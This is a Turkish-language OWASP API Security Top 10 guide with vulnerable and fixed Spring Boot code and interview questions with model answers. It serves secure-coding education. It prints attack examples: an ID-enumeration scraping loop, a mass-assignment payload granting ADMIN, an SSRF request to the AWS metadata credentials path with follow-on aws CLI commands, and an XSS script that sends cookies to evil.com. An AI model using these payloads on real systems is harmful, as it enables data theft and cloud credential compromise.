# 09a — OWASP API Security Top 10: Mülakat Soruları & Gerçek Hayat Sorunları

---

## Bölüm 1: API1–API5 Yetkilendirme & Kimlik Hataları

### Gerçek Hayat Sorunları

---

**Sorun 1: API1 — BOLA: Sipariş ID sequential, başkasının verisine erişildi**

```
Senaryo:
  E-ticaret uygulaması. Sipariş ID: 1, 2, 3, ... (sequential integer).

  // YANLIŞ
  @GetMapping("/api/orders/{orderId}")
  public Order getOrder(@PathVariable Long orderId) {
      return orderRepo.findById(orderId).orElseThrow();
  }

  Normal kullanıcı (userId=500):
    GET /api/orders/8842 → kendi siparişi ✓
    GET /api/orders/8843 → bir sonraki sipariş → başkasının!
    
  Otomasyon:
    for i in range(1, 100000):
        r = requests.get(f"/api/orders/{i}", headers=auth_headers)
        if r.status_code == 200:
            save(r.json())  # ad, adres, ürün, fiyat
  
  100,000 sipariş: isim, adres, telefon, ürünler → 2 saatte çekildi.
  GDPR ihlali → veri ihlali bildirimi → 72 saat içinde yetkililere.

  Gerçek vaka: 2021 Peloton API — 3 milyon kullanıcının verisi açık.
  Auth gerektiriyordu ama kendi hesabınla başkasının profilini çekebiliyordunuz.

Düzeltme:
  // DOĞRU — sahiplik kontrolü + UUID
  @GetMapping("/api/orders/{orderId}")
  public Order getOrder(
          @PathVariable UUID orderId,           // int değil UUID → tahmin zor
          @AuthenticationPrincipal UserDetails user) {
      return orderRepo.findByIdAndOwnerEmail(orderId, user.getUsername())
          .orElseThrow(() -> new ResponseStatusException(
              HttpStatus.FORBIDDEN, "Access denied"));
  }

  UUID avantajı: tahmin etmek neredeyse imkansız.
  Ama UUID tek başına yetmez → sahiplik kontrolü zorunlu.
  
  Test yaklaşımı (BOLA testini otomatize et):
    userA ile oluştur → orderId al.
    userB ile o orderId'ye GET → 403 gelmeli.
    Integration test suite'e ekle → her deploy.
```

---

**Sorun 2: API3 — Mass Assignment: kullanıcı kendi rolünü admin yaptı**

```
Senaryo:
  Kullanıcı profil güncelleme:

  // YANLIŞ — entity doğrudan request body'den
  @PutMapping("/api/users/{id}")
  public User updateUser(@PathVariable Long id,
                         @RequestBody User user) {
      user.setId(id);
      return userRepo.save(user);  // TÜM alanlar güncellendi!
  }

  Normal PUT isteği:
    {"name": "Ali Yılmaz", "email": "ali@example.com"}

  Saldırgan PUT isteği (ek alan ekle):
    {
      "name": "Ali Yılmaz",
      "email": "ali@example.com",
      "role": "ADMIN",              ← ekstra alan!
      "isActive": true,
      "creditBalance": 99999,       ← bakiye
      "emailVerified": true         ← doğrulanmamış email → doğrulandı
    }

  Jackson: bilinmeyen alanları sessizce ignore etmedi → entity'ye map etti.
  userRepo.save() → role=ADMIN olarak kaydedildi.
  Saldırgan admin oldu. Hiçbir yetki kontrolü gerektirmedi.

  Gerçek vaka: 2012 GitHub mass assignment → Homakov, admin erişimi aldı.
  "role" alanını PR ile push ederek → GitHub'ın repo'larına erişti.

Düzeltme:
  // DOĞRU — sadece izin verilen alanları içeren DTO
  public record UpdateUserRequest(
      @NotBlank @Size(max = 100) String name,
      @Email @NotBlank String email
      // role, isActive, creditBalance, emailVerified → YOK
  ) {}

  @PutMapping("/api/users/{id}")
  public UserDTO updateUser(
          @PathVariable Long id,
          @RequestBody @Valid UpdateUserRequest req,
          @AuthenticationPrincipal UserDetails auth) {

      User user = userRepo.findByIdAndEmail(id, auth.getUsername())
          .orElseThrow();
      user.setName(req.name());   // sadece izinli alanlar
      user.setEmail(req.email()); // role → dokunulmadı
      return toDTO(userRepo.save(user));
  }

  // Jackson global ayar (ek güvenlik katmanı):
  @JsonIgnoreProperties(ignoreUnknown = true)
  // Veya ObjectMapper: FAIL_ON_UNKNOWN_PROPERTIES = false (default)
  // Ama bu DTO olmadığında yardımcı olmaz.
  // Birincil çözüm: DTO kullan, entity'yi asla expose etme.
```

---

**Sorun 3: API4 — Sınırsız resource tüketimi: pagination limiti yok, 4 milyon kayıt belleğe yüklendi**

```
Senaryo:
  Admin paneli: kullanıcı listesi.

  @GetMapping("/api/users")
  public List<User> getUsers(
          @RequestParam(defaultValue = "0") int page,
          @RequestParam(defaultValue = "20") int size) {
      return userRepo.findAll(PageRequest.of(page, size)).getContent();
  }

  Normal istek: GET /api/users?page=0&size=20 → 20 kayıt ✓
  Saldırı: GET /api/users?page=0&size=10000000

  size=10000000 → PageRequest.of(0, 10_000_000) → DB'den 4 milyon kayıt çek.
  Her User: 2KB → 4M × 2KB = 8 GB JVM heap.
  OutOfMemoryError → tüm servis çöktü.
  
  Eş zamanlı 5 istek → cluster OOM → production down.
  
  Ayrıca maliyet saldırısı:
    POST /api/notifications/send-bulk → 10 milyon alıcı → AWS SES fatura patlaması.
    POST /api/images/upload → 50GB dosya → S3 maliyet + disk.

Düzeltme:
  @GetMapping("/api/users")
  public Page<UserDTO> getUsers(
          @RequestParam(defaultValue = "0") int page,
          @RequestParam(defaultValue = "20") int size) {

      int safeSize = Math.min(size, 100);  // maksimum 100
      return userRepo.findAll(PageRequest.of(page, safeSize))
                     .map(this::toDTO);
  }

  Dosya upload:
    spring.servlet.multipart.max-file-size=10MB
    spring.servlet.multipart.max-request-size=10MB

  Batch işlemler:
    @PostMapping("/bulk")
    void bulkCreate(@RequestBody @Size(max = 100) List<CreateRequest> items) { }
    // @Size(max=100) → Bean Validation → 101 item → 400 Bad Request

  Timeout:
    spring.mvc.async.request-timeout=30000 (30s)
    // DB query timeout: @QueryHint name="javax.persistence.query.timeout" value="5000"

  Rate limiting (endpoint bazlı):
    /api/users → 60 req/dakika/IP
    /api/notifications/send → 10 req/dakika/user
    /api/images/upload → 5 req/dakika/user
```

---

**Sorun 4: API5 — BFLA: gizli admin endpoint, kullanıcı tarafından bulundu**

```
Senaryo:
  Admin endpoint'leri "gizli" tutulmuş, auth kontrolü eklenmemiş.
  "Kimse URL'yi bilemez" varsayımı — Security by obscurity.

  @DeleteMapping("/api/v1/internal/users/{id}")
  public ResponseEntity<Void> deleteUser(@PathVariable Long id) {
      userService.hardDelete(id);  // yetki kontrolü yok!
      return ResponseEntity.noContent().build();
  }

  Saldırgan:
    Uygulama JS bundle'ını inceledi → API URL'leri string olarak.
    Swagger/OpenAPI endpoint aktif: /v3/api-docs → tüm endpoint'ler listelendi.
    JavaScript map dosyası: /api/v1/internal/users → tespit edildi.
    
    DELETE /api/v1/internal/users/1 → 204 No Content (admin silindi!)
    DELETE /api/v1/internal/users/{1..1000} → 1000 kullanıcı silindi.

  Gerçek zarar:
    2023: Optus (Avustralya) — admin API herkese açıktı.
    10 milyon müşteri verisi silme/çekme erişimi.

Düzeltme:
  // DOĞRU — tüm admin endpoint'lerde explicit auth
  @DeleteMapping("/api/admin/users/{id}")
  @PreAuthorize("hasRole('ADMIN')")
  public ResponseEntity<Void> deleteUser(
          @PathVariable Long id,
          @AuthenticationPrincipal UserDetails admin) {
      
      auditLog.log(admin.getUsername(), "DELETE_USER", id);  // audit kaydı
      userService.softDelete(id);  // soft delete + audit
      return ResponseEntity.noContent().build();
  }

  SecurityConfig — tüm /api/admin/** için ADMIN zorunlu:
  http.authorizeHttpRequests(auth -> auth
      .requestMatchers("/api/admin/**").hasRole("ADMIN")
      .requestMatchers("/api/internal/**").hasRole("SYSTEM")
      .anyRequest().authenticated()
  );

  // Swagger production'da kapat:
  springdoc.api-docs.enabled=${SWAGGER_ENABLED:false}
  // Dev: true, Prod: false (env var ile)

  API Gateway whitelist:
    Sadece bilinen endpoint pattern'leri → forward.
    /api/internal/** → API GW'den geçme → internal network only.
```

---

## Bölüm 2: API6–API10 İş Akışı & Yapılandırma Hataları

### Gerçek Hayat Sorunları

---

**Sorun 5: API6 — Bot flash sale tüm stoku 0.3 saniyede satın aldı**

```
Senaryo:
  E-ticaret flash sale: 100 adet ürün, %70 indirim, belirli saatte başladı.

  Bot saldırısı:
    Saldırgan: 50 hesap oluşturdu.
    Her hesap: pre-loaded sepet.
    Flash sale başladığı saniye: 50 paralel POST /api/orders/checkout.
    0.3 saniyede: 50 sipariş → 50 ürün.
    Saniye 0.5: CAPTCHA'sız, bot korumasız → 50 daha.
    Saniye 1.0: 100 ürün tükendi.
    Gerçek kullanıcılar: "Stok yok" → marka imajı zarar.

  Bot satın aldı → stokist olarak eBay'de 3x fiyata sattı.

Düzeltme (katmanlı):
  1. CAPTCHA (satın alma öncesi):
    reCAPTCHA v3 → bot skoru (0.0–1.0) → düşükse doğrulama.
    Invisible CAPTCHA: gerçek kullanıcı etkilenmez.

  2. Hesap doğrulama zorunluluğu:
    Email + telefon doğrulama olmadan flash sale'e katılamaz.
    Sahte hesap oluşturma maliyeti artıyor.

  3. İş kuralı limitleri:
    Aynı kullanıcı: flash sale'de max 2 adet.
    Aynı IP: max 3 sipariş (flash sale süresi boyunca).
    Aynı ödeme kartı: max 1 sipariş.

  4. Davranış analizi:
    Sipariş tamamlama süresi < 500ms → bot şüphesi → challenge.
    Fare hareketi yok → bot şüphesi.
    User-Agent bot pattern → engelle.

  5. Queue sistemi:
    Flash sale: herkes sıraya giriyor (waiting room).
    Rastgele sıra → bot avantajı azalıyor.
    Cloudflare Waiting Room, Queue-it.

  6. Rate limiting (Redis tabanlı):
    /api/orders/checkout → per-user: 5 req/dakika.
    Sliding window → burst engelleme.
```

---

**Sorun 6: API7 — SSRF: webhook URL olarak AWS metadata endpoint girildi**

```
Senaryo:
  Uygulama: webhook test özelliği (URL'ye test request gönder).

  @PostMapping("/api/webhooks/test")
  public WebhookTestResult testWebhook(@RequestBody WebhookTestReq req) {
      ResponseEntity<String> response = restTemplate.getForEntity(
          req.getUrl(), String.class);  // Doğrulama yok!
      return new WebhookTestResult(response.getStatusCode(), response.getBody());
  }

  Saldırı:
    POST /api/webhooks/test
    {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role"}
    
    EC2 metadata endpoint → Response:
    {
      "AccessKeyId": "ASIA...",
      "SecretAccessKey": "abc123...",
      "Token": "IQoJb3Jp...",
      "Expiration": "2026-06-24T18:00:00Z"
    }
    
    Saldırgan bu credential ile:
    aws s3 ls → tüm bucket'lar listelendi.
    aws rds describe-db-instances → DB endpoint'leri.
    aws iam list-users → tüm IAM kullanıcıları.

  Gerçek vaka: 2019 Capital One — SSRF → EC2 metadata → S3 → 100 milyon müşteri.
  $80 milyon GDPR cezası.

Düzeltme:
  private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");

  @PostMapping("/api/webhooks/test")
  public WebhookTestResult testWebhook(@RequestBody @Valid WebhookTestReq req) {
      URI uri = URI.create(req.getUrl());
      
      // 1. Scheme kontrolü
      if (!ALLOWED_SCHEMES.contains(uri.getScheme())) {
          throw new BadRequestException("Only HTTP/HTTPS allowed");
      }

      // 2. IP çözümle → private IP bloğu
      InetAddress addr = InetAddress.getByName(uri.getHost());
      if (addr.isLoopbackAddress()       // 127.0.0.1
       || addr.isLinkLocalAddress()      // 169.254.x.x — AWS metadata!
       || addr.isSiteLocalAddress()) {   // 10.x, 192.168.x, 172.16.x
          throw new BadRequestException("Private addresses not allowed");
      }

      // 3. Domain whitelist (daha güvenli)
      if (!allowedWebhookDomains.contains(uri.getHost())) {
          throw new BadRequestException("Domain not in whitelist");
      }

      // 4. DNS rebinding koruması: çözümlenen IP'yi cache'le + tekrar kontrol
      ResponseEntity<String> resp = restTemplate.getForEntity(uri, String.class);
      return new WebhookTestResult(resp.getStatusCode().value());
      // Response body'yi kullanıcıya dönme! (veri sızıntısı)
  }

  AWS IMDSv2 (EC2 metadata için ek koruma):
    EC2 instance'ta IMDSv2 zorunlu yap:
    aws ec2 modify-instance-metadata-options --http-tokens required
    → GET ile metadata alınamaz, PUT ile token gerekli → SSRF bypass zorlaştı.
```

---

**Sorun 7: API9 — Eski API versiyonu hâlâ production'da, güvenlik güncellemesi yapılmadı**

```
Senaryo:
  API v1 → v2'ye geçildi. v2: tüm güvenlik güncellemeleri yapıldı.
  v1: "kimse kullanmıyor, kapatalım ama önce emin olalım" → unutuldu.

  /api/v2/auth/login → rate limiting, brute force koruması, CAPTCHA ✓
  /api/v1/auth/login → hiçbiri yok! (eski kod)

  Saldırgan:
    v2: 5 başarısız → 15 dakika lock.
    v1 → sınırsız deneme → RockYou listesi → 4 saatte admin şifresi kırıldı.

  Ayrıca:
  /api/v1/users/{id} → BOLA fix v2'de yapıldı, v1'de yapılmadı.
  /api/beta/admin/export → test sırasında eklendi, kaldırılmadı.
  /api/internal/debug → sadece dev ortamında olmalıydı.

  API discovery:
    Saldırgan: nuclei, ffuf ile endpoint tarama.
    /api/v1/, /api/v2/, /api/v3/, /api/beta/, /api/internal/ → sistemli tarama.
    Eski/unutulmuş endpoint: güvenlik açıkları yaşıyor.

Düzeltme:
  1. API versiyonlarını takip et (Swagger/OpenAPI):
    Her versiyon: hangi endpoint aktif, hangi deprecated, hangi sunset tarihi.

  2. Deprecation lifecycle:
    v1 → Deprecation: Sat, 01 Jan 2026 00:00:00 GMT header ekle.
    Sunset: Tue, 01 Jul 2026 00:00:00 GMT → kapatılacak tarih.
    6 ay sonra → nginx: /api/v1/ → 410 Gone.

  3. API Gateway whitelist:
    Sadece dokümante edilmiş endpoint'ler → forward.
    Bilinmeyen path → 404 (değil 403 — existence leak etme).
    
    # Kong: route sadece bilinen path'ler
    # Unknown path → 404 döner, iç servise ulaşmaz.

  4. Infrastructure as Code:
    Tüm endpoint'ler Terraform/K8s manifest'te → git'te.
    "Bu endpoint kim ekledi, neden?" → git history.
    Orphan endpoint → PR review'da yakalanır.

  5. Periyodik API audit:
    Ayda bir: production'daki endpoint listesi vs dokümantasyon.
    Fark varsa → kim ekledi, neden, hâlâ gerekli mi?
```

---

**Sorun 8: API10 — 3rd party API response XSS içeriyordu, sanitize edilmedi**

```
Senaryo:
  Haber agregasyon uygulaması: 3rd party haber API'sinden içerik çekiyor.
  İçerik HTML olarak render ediliyor.

  // Backend
  @GetMapping("/api/news/{id}")
  public NewsArticle getNews(@PathVariable String id) {
      NewsArticle article = newsApiClient.fetch(id);
      return article;  // content alanı HTML — sanitize edilmedi!
  }

  // Frontend (React)
  <div dangerouslySetInnerHTML={{ __html: article.content }} />

  3rd party API compromise edildi (supply chain saldırısı):
    API response content alanına zararlı script eklendi:
    "<p>Haber içeriği...</p><script>fetch('evil.com?c='+document.cookie)</script>"
    
    Uygulama güvendi → "bizim API değil ama güvenilir partner."
    Her kullanıcı haberi açtı → script çalıştı → session cookie çalındı.

  Başka senaryo (open redirect):
    Ödeme API response: {"status": "success", "redirectUrl": "http://evil.com/phishing"}
    Uygulama: window.location = response.redirectUrl → kullanıcı phishing sayfasına yönlendirildi.

Düzeltme:
  // Backend: 3rd party response'u da validate et
  @GetMapping("/api/news/{id}")
  public NewsArticleDTO getNews(@PathVariable String id) {
      NewsArticle raw = newsApiClient.fetch(id);
      
      // HTML sanitize
      PolicyFactory policy = Sanitizers.FORMATTING
          .and(Sanitizers.LINKS)
          .and(Sanitizers.BLOCKS);
      String safeContent = policy.sanitize(raw.getContent());
      // <script> kaldırıldı, <p><b><a href> bırakıldı.
      
      // URL validation
      String safeRedirectUrl = validateRedirectUrl(raw.getRedirectUrl());
      
      return new NewsArticleDTO(raw.getTitle(), safeContent, safeRedirectUrl);
  }

  private String validateRedirectUrl(String url) {
      if (url == null) return null;
      URI uri = URI.create(url);
      // Sadece kendi domain'lerimize redirect izin ver
      Set<String> allowed = Set.of("myapp.com", "www.myapp.com");
      if (!allowed.contains(uri.getHost())) {
          log.warn("Suspicious redirect URL from 3rd party: {}", url);
          return "/";  // fallback
      }
      return url;
  }

  Frontend: dangerouslySetInnerHTML yerine DOMPurify:
    import DOMPurify from 'dompurify';
    const clean = DOMPurify.sanitize(article.content);
    <div dangerouslySetInnerHTML={{ __html: clean }} />
    // Client-side ek katman — backend sanitize edilmiş olsa bile.

  3rd party resilience:
    Circuit breaker: partner API down → fallback content.
    Timeout: 3 saniye üzeri → timeout, kendi cache'den dön.
    Response schema validation (JSON Schema): beklenmedik alan → hata log.
```

---

### Mülakat Soruları

**Junior / Mid:**

1. BOLA ve BFLA arasındaki fark nedir? Her biri için somut örnek ver.

   > **Beklened:** BOLA (Broken Object Level Authorization — API1): objeye erişim kontrolü. "Bu nesne bu kullanıcıya mı ait?" `GET /orders/1234` → başkasının siparişi okunabiliyor. Kontrol: `findByIdAndOwnerId`. BFLA (Broken Function Level Authorization — API5): fonksiyon/işlem kontrolü. "Bu kullanıcı bu işlemi yapabilir mi?" `DELETE /admin/users/456` → normal kullanıcı admin işlemi yapabiliyor. Kontrol: `@PreAuthorize("hasRole('ADMIN')")`. Fark özeti: BOLA → kimse olmayan veriye erişim. BFLA → sahip olmadığın yetkiyle işlem yapma. Her ikisi de sıkça birlikte görülür. Önlemler: BOLA → her resource endpoint'te ownership check. BFLA → tüm admin/sensitive endpoint'lerde explicit rol check. "Security by obscurity" (endpoint gizli tutmak) ikisi için de yetersiz.

2. Mass Assignment nedir? Spring'de nasıl önlenir?

   > **Beklened:** Mass assignment: istek body'sindeki alanların doğrudan entity'ye map edilmesi. Kullanıcı değiştirememesi gereken alanları (role, isActive, creditBalance) request'e ekleyerek değiştirebilir. Tarihi vaka: GitHub 2012 (Homakov). Nasıl oluşur: `@RequestBody User user` + `userRepo.save(user)` → JSON'daki tüm alanlar entity'ye. Spring'de önleme: (1) DTO pattern — yalnızca izinli alanları içeren ayrı class. `UpdateUserRequest(String name, String email)` — role yok. (2) `@JsonIgnoreProperties` — spesifik alanları ignore et (ama DTO daha güvenli). (3) `@JsonProperty(access = READ_ONLY)` — yazılamaz işaretleme. En güvenli: her endpoint için ayrı request DTO. "Tüm alanları alıyım, gereksizleri ignore ederim" — risk taşır. "Sadece gerekli alanları alan DTO" — güvenli.

3. SSRF nedir? AWS ortamında neden özellikle tehlikelidir?

   > **Beklened:** SSRF (Server Side Request Forgery — API7): sunucu, kullanıcının verdiği URL'ye kendi adına istek atar. Saldırgan kullanıcı = "şu URL'ye istek at" → server iç ağa veya cloud metadata'ya istek atar. AWS'de tehlike: EC2 metadata endpoint: `http://169.254.169.254/latest/meta-data/` — bu IP sadece EC2'den erişilebilir. Browser'dan erişilemez ama server üzerinden SSRF ile erişilir. IAM credentials: `/iam/security-credentials/my-role` → AccessKeyId + SecretAccessKey → tam AWS yetkisi. Capital One 2019: SSRF → EC2 metadata → S3 → 100M müşteri verisi. Önlemler: Private IP bloğu (169.254.x.x, 10.x.x.x, 127.x.x.x) reddet. Domain whitelist (sadece bilinen domain'ler). Scheme: sadece HTTP/HTTPS. IMDSv2: PUT token ile metadata — GET ile erişilemiyor. Response body'yi kullanıcıya dönme (iç bilgi sızdırma).

4. API8 Security Misconfiguration: production ortamında en sık karşılaşılan 3 hata nedir?

   > **Beklened:** 1. Spring Actuator açık: `/actuator/env` → tüm env var'lar (DB şifresi, API key). `/actuator/heapdump` → JVM heap → plaintext şifreler bellekte. Önlem: `management.endpoints.web.exposure.include=health,info`. 2. Stack trace production'da: `{"error": "Table 'users' doesn't exist at line 1"}` → DB şeması sızdı, teknoloji stack belli. Önlem: generic hata mesajı, detay sadece log'a. 3. CORS wildcard + credentials: `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` → browser reddeder ama origin yansıtma ile bypass. Önlem: explicit whitelist. Diğerleri: MongoDB/Redis şifresiz açık. H2 console production'da. Default credentials (admin/admin). HTTP (HTTPS değil). Swagger production'da — tüm endpoint'ler saldırgan için harita. Debug mod production'da açık.

---

**Senior / Architect:**

5. OWASP API Top 10'u göz önünde bulundurarak bir API güvenlik tasarımı nasıl yapılır?

   > **Beklened:** Tasarım aşamasında (Shift Left): Threat modeling: her endpoint için "kim ne yapabilir kötüye kullanabilir?". BOLA: tüm GET/PUT/DELETE → ID + ownership check. BFLA: admin/sensitive endpoint'leri listele → rol matrisi oluştur. Mass assignment: her endpoint için ayrı request DTO. API Gateway katmanı: Rate limiting: per-IP, per-user, per-endpoint. WAF: SQL injection, XSS pattern. TLS 1.3 zorunlu. API key / OAuth2 client auth. Bot koruması (API6): CAPTCHA senaryolarını belirle. Yüksek değerli akışlar (ödeme, flash sale, kupon) → ek koruma. Resource limitleri (API4): her endpoint max request size, pagination cap, timeout. Logging & monitoring: her isteği log (kim, ne, ne zaman, hangi IP). Failed auth spike → alert. Unusual data volume → alert (BOLA saldırısı tespiti). API inventory (API9): Her endpoint → OpenAPI dokümantasyonu. Versiyon lifecycle → sunset tarihi. API GW whitelist.

6. Rate limiting ile brute force koruması tasarımında hangi tradeoff'lar var?

   > **Beklened:** Per-IP rate limiting: artı — basit. eksi — shared IP (NAT, proxy, otel Wi-Fi) → tüm kullanıcıları etkiler. Saldırgan: farklı IP'den devam eder (botnet). Per-Account rate limiting: artı — doğru hedef. eksi — hesap enumeration için kullanılabilir. "5 hata → lock" → "bu email var" anlamına gelir. Çözüm: generic mesaj + aynı lock süresi. Progressive delay: 1s, 2s, 4s, 8s... artı: lock olmadan yavaşlatma. eksi: denial of service — birisi hesabını sürekli deniyor → gerçek kullanıcıya erişim geç. Hesap kilitleme DoS riski: saldırgan bilerek kilitleme başlatır → gerçek kullanıcı erişemez. Önlem: soft lock (delay) + hard lock (verify) kombinasyonu. IP reputation: bilinen bad IP → anında engel. Tor exit node → yüksek friction. Tradeoff özeti: güvenlik sıkılaştıkça UX zorlaşır. Yüksek değerli operasyon (para transferi) → daha sıkı. Düşük değer (içerik okuma) → daha gevşek. Adaptive: anomaly detection → şüpheliye CAPTCHA, normal kullanıcıya yok.

---

## Karma — Architect Seviyesi

7. **"Bir pentest raporunda BOLA, Mass Assignment ve SSRF bulguları geldi. Nasıl önceliklendirirsin ve düzeltme planı nasıl olur?"**

   > **Beklened:** Önceliklendirme (etki × sömürü kolaylığı): SSRF → CRITICAL. Neden: direkt cloud infrastructure compromise, IAM credential çalınması → tüm sisteme yayılma (lateral movement). Capital One örneği. Sömürme: tek request yeterli. BOLA → HIGH. Neden: doğrudan kullanıcı verisi sızıntısı → GDPR/KVKK ihlali, itibar zarar. Sömürme: auth olan herkes yapabilir, otomasyon kolaylaşır. Mass Assignment → HIGH. Neden: privilege escalation (rol değişikliği → admin). Sömürme: API dokümantasyonu yeterliyse kolayca anlaşılır. Acil aksiyonlar (ilk 24 saat): SSRF → WAF kuralı ekle: 169.254.x.x, 10.x.x.x blocklist. URL whitelist geçici → sadece bilinen domain'ler. BOLA → API Gateway'de logging artır: 403 olan istek paterni izle. Kod fix sprint planla. Hafta içi (1 hafta): BOLA fix → tüm findById → findByIdAndOwnerId. Test yazılır (cross-user test). Mass Assignment → tüm @RequestBody User → DTO. Otomatik tarama: Spring bean analiz script. 1 ay: SSRF → URL validator utility class + unit test. Tüm URL alan endpoint'leri gözden geçir (webhook, fetch-url, import). Pentest re-test: düzeltmeler doğrulandı mı? Süreç iyileştirme: SAST kuralları (SonarQube) — BOLA/Mass Assignment pattern tespiti. Yeni endpoint PR review: security checklist (OWASP 10 madde).